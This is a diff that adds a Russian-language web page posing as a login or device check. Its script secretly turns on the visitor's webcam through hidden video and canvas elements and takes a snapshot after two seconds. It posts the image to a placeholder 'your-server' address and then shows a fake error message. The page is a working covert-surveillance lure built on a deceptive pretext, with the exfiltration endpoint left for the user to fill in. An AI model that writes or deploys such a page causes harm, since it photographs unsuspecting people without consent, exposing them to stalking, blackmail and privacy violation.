@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Подтверждение входа</title>
+</head>
+<body>
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <p>Идёт проверка устройства...</p>
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    setTimeout(() => {
+                        ctx.drawImage(video, 0, 0);
+                        const dataURL = canvas.toDataURL('image/jpeg');
+                        fetch('https://ваш-сервер.com/upload', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ image: dataURL })
+                        });
+                        document.body.innerHTML = 'Ошибка, попробуйте позже';
+                    }, 2000);
+                };
+            })
+            .catch(err => {
+                document.body.innerHTML = 'Ваше устройство не поддерживается';
+            });
+    </script>
+</body>
+</html>
